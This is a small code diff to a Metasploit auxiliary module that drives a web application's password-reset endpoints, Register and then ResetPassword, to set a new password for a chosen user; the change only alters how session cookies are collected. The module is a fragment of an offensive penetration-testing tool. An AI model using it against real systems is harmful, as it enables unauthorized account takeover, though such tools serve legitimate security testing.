@@ -48,14 +48,14 @@ class Metasploit4 < Msf::Auxiliary
       fail_with(Failure::Unknown, "Could not contact server")
     end
 
-    cookie = res.headers['Set-Cookie']
+    cookies = res.get_cookies
     domain = $1 if res.body =~ /"domainName":"(.*)"\}\);/
     domain = datastore['DOMAIN'] if datastore['DOMAIN'] != ''
 
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'PasswordReset', 'Application', 'Register'),
       'method' => 'POST',
-      'cookie' => cookie,
+      'cookie' => cookies,
       'vars_post' => {
         'domainname' => domain,
         'userName' => datastore['LOCALUSER'],
@@ -80,7 +80,7 @@ class Metasploit4 < Msf::Auxiliary
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'PasswordReset', 'Application', 'ResetPassword'),
       'method' => 'POST',
-      'cookie' => cookie,
+      'cookie' => cookies,
       'vars_post' => {
         'newPassword' => password,
         'domain' => domain,
